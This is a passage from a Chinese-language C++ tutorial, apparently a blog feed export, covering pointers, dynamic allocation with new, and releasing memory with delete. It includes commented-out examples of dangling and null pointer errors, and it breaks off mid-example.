class="string">&quot; value: &quot;</span> &lt;&lt; file_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func first time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func second time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func(); <span class="comment">// 注意 func_static_var 的值会保持</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int* dangling_ptr;</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     int temp_auto = 100; // 自动存储</span></span><br><span class="line">    <span class="comment">//     dangling_ptr = &amp;temp_auto;</span></span><br><span class="line">    <span class="comment">// &#125; // temp_auto 销毁</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; *dangling_ptr; // 错误! 悬挂指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解这三种存储方式对于编写健壮、高效且无内存错误的 C++ 程序至关重要。现代 C++ 倾向于使用 RAII (Resource Acquisition Is Initialization) 技术和智能指针（如 <code>std::unique_ptr</code>, <code>std::shared_ptr</code>）来自动管理动态内存，以减少手动 <code>new</code>/<code>delete</code> 带来的风险。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.7 指针和自由存储空间</title>
      <link href="2025/04/26/4.7_%E6%8C%87%E9%92%88%E5%92%8C%E8%87%AA%E7%94%B1%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4/"/>
      <url>2025/04/26/4.7_%E6%8C%87%E9%92%88%E5%92%8C%E8%87%AA%E7%94%B1%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>到目前为止，我们创建的变量（包括数组、结构等）在声明时，编译器会为其分配内存。这些变量的内存管理是自动的（自动存储或静态存储）。但是，有时我们需要在程序运行时根据需要动态地分配和释放内存。<strong>指针 (Pointer)</strong> 和 <strong>自由存储空间 (Free Store)**（也常称为</strong>堆 Heap**）是实现这一目标的关键。</p><p><strong>指针</strong>是一种特殊的变量，它存储的是另一个变量的<strong>内存地址</strong>。通过指针，我们可以间接地访问和修改该内存地址处的数据。</p><p><strong>自由存储空间</strong>是程序可以动态申请使用的内存区域。与自动变量（函数执行完就销毁）或静态变量（程序整个生命周期都存在）不同，程序员需要手动管理自由存储空间中分配的内存的生命周期。</p><h2 id="4-7-1-声明和初始化指针"><a href="#4-7-1-声明和初始化指针" class="headerlink" title="4.7.1 声明和初始化指针"></a>4.7.1 声明和初始化指针</h2><p><strong>声明指针:</strong></p><p>声明指针需要指定它将指向的数据类型，并在变量名前加上星号 <code>*</code>（星号可以靠近类型名、变量名或在两者之间）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName * pointerName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: 指针将要指向的数据的类型。</li><li>  <code>*</code>: 表明 <code>pointerName</code> 是一个指针。</li><li>  <code>pointerName</code>: 指针变量的名称。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_int;      <span class="comment">// 声明一个指向 int 类型的指针 p_int</span></span><br><span class="line"><span class="keyword">double</span> * p_double; <span class="comment">// 声明一个指向 double 类型的指针 p_double</span></span><br><span class="line"><span class="keyword">char</span> * p_char;    <span class="comment">// 声明一个指向 char 类型的指针 p_char</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> * p_str; <span class="comment">// 声明一个指向 string 对象的指针 p_str</span></span><br></pre></td></tr></table></figure><p><strong>获取地址 (<code>&amp;</code> 运算符):</strong></p><p>地址运算符 <code>&amp;</code> 用于获取一个变量的内存地址。</p><p><strong>初始化指针:</strong></p><p>指针在声明时应被初始化，以避免指向不确定的内存地址。常见的初始化方式：</p><ol><li> <strong>初始化为 <code>nullptr</code> (C++11 及以后):</strong> <code>nullptr</code> 是表示空指针的关键字，表示该指针当前不指向任何有效的内存地址。这是推荐的初始化空指针的方式。</li><li> <strong>初始化为 <code>0</code> 或 <code>NULL</code>:</strong> 在 C++11 之前，通常使用 <code>0</code> 或宏 <code>NULL</code> (通常定义为 0) 来表示空指针。虽然仍可用，但 <code>nullptr</code> 类型更安全。</li><li> <strong>初始化为变量地址:</strong> 使用 <code>&amp;</code> 运算符获取一个已存在变量的地址来初始化指针。<strong>指针的类型必须与变量的类型匹配</strong>（或能隐式转换）。</li></ol><p><strong>解引用 (<code>*</code> 运算符):</strong></p><p>解引用运算符 <code>*</code> 用于访问指针所指向的内存地址处存储的值。当 <code>*</code> 用于已初始化的有效指针变量前时，它表示“获取指针指向的值”。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> updates = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_updates; <span class="comment">// 声明一个指向 int 的指针，未初始化 (危险!)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化指针</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="literal">nullptr</span>; <span class="comment">// 初始化为空指针 (推荐)</span></span><br><span class="line">    <span class="keyword">int</span> * p_zero = <span class="number">0</span>;      <span class="comment">// 初始化为空指针 (旧式)</span></span><br><span class="line">    <span class="comment">// NULL 宏通常在 &lt;cstddef&gt; 或其他 C 头文件中定义</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用地址初始化</span></span><br><span class="line">    p_updates = &amp;updates; <span class="comment">// 将 updates 变量的地址赋给 p_updates</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问指针信息</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of updates: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// 输出 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of updates: &quot;</span> &lt;&lt; &amp;updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;          <span class="comment">// 输出 updates 的内存地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of p_updates (address): &quot;</span> &lt;&lt; p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出存储在 p_updates 中的地址 (同上)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用解引用运算符访问指针指向的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_updates: &quot;</span> &lt;&lt; *p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6 (updates 的值)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用解引用运算符修改指针指向的值</span></span><br><span class="line">    *p_updates = *p_updates + <span class="number">1</span>; <span class="comment">// 将 p_updates 指向的值 (updates) 加 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now updates has value: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指向其他类型</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> * p_price = &amp;price; <span class="comment">// p_price 指向 price</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_price: &quot;</span> &lt;&lt; *p_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 99.99</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int * p_wrong = &amp;price; // 错误! 指针类型 (int*) 与变量类型 (double) 不匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  <code>int updates;</code>: <code>updates</code> 是一个 <code>int</code> 变量。</li><li>  <code>int * p_updates;</code>: <code>p_updates</code> 是一个指针变量，它存储的是一个 <code>int</code> 变量的地址。</li><li>  <code>p_updates</code>: 存储的地址值。</li><li>  <code>*p_updates</code>: 存储在该地址处的 <code>int</code> 值。</li></ul><h2 id="4-7-2-指针的危险"><a href="#4-7-2-指针的危险" class="headerlink" title="4.7.2 指针的危险"></a>4.7.2 指针的危险</h2><p>指针非常强大，但也容易出错，是 C++ 中常见的 bug 来源。</p><ol><li><strong>解引用未初始化的指针:</strong> 如果指针没有被初始化，它会包含一个随机的地址（垃圾值）。解引用这种指针（试图访问该随机地址处的值）会导致<strong>未定义行为</strong>，通常导致程序崩溃。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_uninitialized;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_uninitialized; // 极度危险! 程序可能崩溃</span></span><br><span class="line"><span class="comment">// *p_uninitialized = 100;      // 极度危险! 可能覆盖关键数据或导致崩溃</span></span><br></pre></td></tr></table></figure></li><li><strong>解引用空指针:</strong> 解引用 <code>nullptr</code> (或 <code>0</code>, <code>NULL</code>) 同样是未定义行为，通常也会导致程序崩溃。在使用指针前，最好检查它是否为空。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_null = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_null; // 危险! 程序可能崩溃</span></span><br><span class="line"><span class="keyword">if</span> (p_null != <span class="literal">nullptr</span>) &#123; <span class="comment">// 检查指针是否有效</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>悬挂指针 (Dangling Pointer):</strong> 当指针指向的内存已经被释放或不再有效时，该指针就成为悬挂指针。解引用悬挂指针也是未定义行为。这通常发生在 <code>delete</code> 之后（见 4.7.5）或指向局部变量的指针在其作用域结束后仍然存在时。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_dangle;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> local_var = <span class="number">10</span>;</span><br><span class="line">    p_dangle = &amp;local_var; <span class="comment">// p_dangle 指向局部变量</span></span><br><span class="line">&#125; <span class="comment">// local_var 在这里被销毁，内存可能被回收</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_dangle; // 危险! p_dangle 是悬挂指针</span></span><br></pre></td></tr></table></figure></li><li> <strong>内存泄漏 (Memory Leak):</strong> 如果使用 <code>new</code> 分配了内存（见 4.7.4），但忘记使用 <code>delete</code> 释放，或者丢失了指向该内存的唯一指针，这块内存就无法再被程序访问或释放，造成内存泄漏。程序运行时间越长，泄漏的内存越多，最终可能耗尽系统资源。</li></ol><p><strong>安全使用指针的建议:</strong></p><ul><li>  <strong>总是初始化指针:</strong> 声明指针时立即初始化为 <code>nullptr</code> 或一个有效的地址。</li><li>  <strong>在使用前检查:</strong> 在解引用指针前，检查它是否为 <code>nullptr</code>。</li><li>  <strong>谨慎处理指针生命周期:</strong> 确保指针指向的内存在指针使用期间是有效的。</li><li>  <strong>配对 <code>new</code> 和 <code>delete</code>:</strong> 动态分配的内存必须手动释放。</li></ul><h2 id="4-7-3-指针和数字"><a href="#4-7-3-指针和数字" class="headerlink" title="4.7.3 指针和数字"></a>4.7.3 指针和数字</h2><p>虽然指针存储的是内存地址，而地址本质上是数字，但<strong>指针类型和整数类型是不同的</strong>。不能随意将整数赋给指针（除了 <code>0</code>/<code>nullptr</code>），也不能直接将指针当作普通整数进行算术运算（指针算术有特殊规则，见 4.8）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_value = &amp;value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针的值是地址 (一个数字)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address stored in p_value: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能直接将任意整数赋给指针</span></span><br><span class="line">    <span class="comment">// p_value = 1000; // 错误! 类型不匹配 (除非使用 reinterpret_cast，但通常不安全)</span></span><br><span class="line">    </span><br><span class="line">    p_value = <span class="literal">nullptr</span>; <span class="comment">// 合法，赋空指针</span></span><br><span class="line">    p_value = <span class="number">0</span>;       <span class="comment">// 合法，赋空指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针可以转换为整数 (通常使用 reinterpret_cast，不推荐)</span></span><br><span class="line">    <span class="comment">// uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); </span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数不能直接转换为指针 (除了 0)</span></span><br><span class="line">    <span class="keyword">int</span> address_int = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">// int * p_from_int = address_int; // 错误!</span></span><br><span class="line">    <span class="comment">// int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // 可以编译，但极度危险</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将指针视为地址，而不是普通的数字，有助于避免类型错误和不安全的操作。</p><h2 id="4-7-4-使用new来分配内存"><a href="#4-7-4-使用new来分配内存" class="headerlink" title="4.7.4 使用new来分配内存"></a>4.7.4 使用new来分配内存</h2><p><code>new</code> 运算符用于在程序的<strong>自由存储区 (Free Store)</strong> 或 <strong>堆 (Heap)</strong> 上动态分配内存。这允许你在运行时根据需要创建变量或对象，而不是在编译时就确定。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span class="comment">// 或者在声明时分配</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span class="comment">// 也可以带初始化器</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName (initializer); <span class="comment">// C++98/03</span></span><br><span class="line">typeName * pointerVariable = <span class="keyword">new</span> typeName &#123;initializer&#125;; <span class="comment">// C++11 列表初始化</span></span><br></pre></td></tr></table></figure><ul><li>  <code>new</code>: 运算符。</li><li>  <code>typeName</code>: 要分配内存的数据类型。</li><li>  <code>initializer</code> (可选): 用于初始化新分配内存的值。</li></ul><p><strong>工作流程:</strong></p><ol><li> <code>new</code> 在自由存储区找到一块足够大的、未使用的内存块，以存储 <code>typeName</code> 类型的数据。</li><li> <code>new</code> 返回这块内存的<strong>起始地址</strong>。</li><li> 这个地址被赋给一个相应类型的指针变量。</li></ol><p><strong>如果 <code>new</code> 无法分配所需的内存（例如内存不足），它会抛出一个 <code>std::bad_alloc</code> 异常</strong>（除非使用了 <code>new (std::nothrow)</code> 版本，该版本在失败时返回 <code>nullptr</code>）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;new&gt; // 为了 std::bad_alloc (虽然不一定需要显式包含) 和 std::nothrow</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 分配一个 int 的内存</span></span><br><span class="line">    <span class="keyword">int</span> * p_int = <span class="keyword">new</span> <span class="keyword">int</span>; <span class="comment">// 在自由存储区分配一个 int 大小的内存</span></span><br><span class="line">    <span class="keyword">if</span> (p_int == <span class="literal">nullptr</span>) &#123; <span class="comment">// 理论检查 (对于普通 new，失败会抛异常)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Memory allocation failed!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *p_int = <span class="number">101</span>; <span class="comment">// 通过指针访问并赋值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配一个 double 并初始化</span></span><br><span class="line">    <span class="keyword">double</span> * p_double = <span class="keyword">new</span> <span class="keyword">double</span> (<span class="number">99.99</span>); <span class="comment">// 分配并初始化为 99.99</span></span><br><span class="line">    <span class="comment">// 或者 C++11 列表初始化</span></span><br><span class="line">    <span class="comment">// double * p_double = new double &#123;99.99&#125;; </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated int: &quot;</span> &lt;&lt; *p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamically allocated double: &quot;</span> &lt;&lt; *p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of int: &quot;</span> &lt;&lt; p_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of double: &quot;</span> &lt;&lt; p_double &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 内存释放将在下一节讲解 ---</span></span><br><span class="line">    <span class="comment">// delete p_int; </span></span><br><span class="line">    <span class="comment">// delete p_double;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 nothrow 版本 (失败时返回 nullptr)</span></span><br><span class="line">    <span class="keyword">int</span> * p_lots_of_ints = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow) <span class="keyword">int</span>[<span class="number">1000000000</span>]; <span class="comment">// 尝试分配巨大数组</span></span><br><span class="line">    <span class="keyword">if</span> (p_lots_of_ints == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation failed, but program continues.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Huge memory allocation succeeded (unlikely).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// delete[] p_lots_of_ints; // 如果成功，需要释放</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态分配的内存<strong>不会</strong>像自动变量那样在作用域结束时自动释放。程序员必须负责在不再需要时手动释放它。</p><h2 id="4-7-5-使用delete释放内存"><a href="#4-7-5-使用delete释放内存" class="headerlink" title="4.7.5 使用delete释放内存"></a>4.7.5 使用delete释放内存</h2><p><code>delete</code> 运算符用于释放由 <code>new</code> 分配的内存，将其归还给自由存储区，以便后续可以重新分配使用。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> pointerVariable; </span><br></pre></td></tr></table></figure><ul><li>  <code>delete</code>: 运算符。</li><li>  <code>pointerVariable</code>: 指向由 <code>new</code>（**不是 <code>new[]</code>**）分配的内存的指针。</li></ul><p><strong>工作流程:</strong></p><ol><li> <code>delete</code> 接收一个指针，该指针必须指向由 <code>new</code> 分配的内存块的起始地址。</li><li> <code>delete</code> 释放该指针指向的内存块。</li><li> 指针变量本身的值<strong>不会</strong>被自动修改（它仍然存储着那个现在无效的地址），成为**悬挂指针 (Dangling Pointer)**。</li></ol><p><strong>重要规则:</strong></p><ul><li>  <strong><code>new</code> 和 <code>delete</code> 必须配对使用:</strong> 每个 <code>new</code> 都应该对应一个 <code>delete</code>。</li><li>  <strong>不要 <code>delete</code> 同一块内存两次:</strong> 对同一块内存执行两次 <code>delete</code> 是未定义行为。</li><li>  <strong>不要 <code>delete</code> 不是由 <code>new</code> 分配的内存:</strong> 例如，不要 <code>delete</code> 指向自动变量（栈变量）或静态变量的指针。</li><li>  <strong>不要 <code>delete</code> 空指针 (<code>nullptr</code>):</strong> 对空指针执行 <code>delete</code> 是安全且无效果的。</li><li>  <strong><code>delete</code> 之后将指针设为 <code>nullptr</code>:</strong> 释放内存后，最好立即将指针设置为 <code>nullptr</code>，以防止它成为悬挂指针被意外使用。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 分配内存</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="keyword">new</span> <span class="keyword">int</span> (<span class="number">42</span>);</span><br><span class="line">    <span class="keyword">double</span> * p_temp = <span class="keyword">new</span> <span class="keyword">double</span>;</span><br><span class="line">    *p_temp = <span class="number">123.45</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value points to: &quot;</span> &lt;&lt; *p_value &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_temp points to: &quot;</span> &lt;&lt; *p_temp &lt;&lt; <span class="string">&quot; at address &quot;</span> &lt;&lt; p_temp &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 释放内存</span></span><br><span class="line">    <span class="keyword">delete</span> p_value; </span><br><span class="line">    <span class="keyword">delete</span> p_temp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter delete:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// p_value 和 p_temp 现在是悬挂指针!</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value still holds address: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // 危险! 未定义行为</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将指针设为 nullptr (好习惯)</span></span><br><span class="line">    p_value = <span class="literal">nullptr</span>;</span><br><span class="line">    p_temp = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After setting to nullptr:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; p_value holds: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0 或类似表示空指针的值</span></span><br><span class="line"></span><br><span class="line">    <span 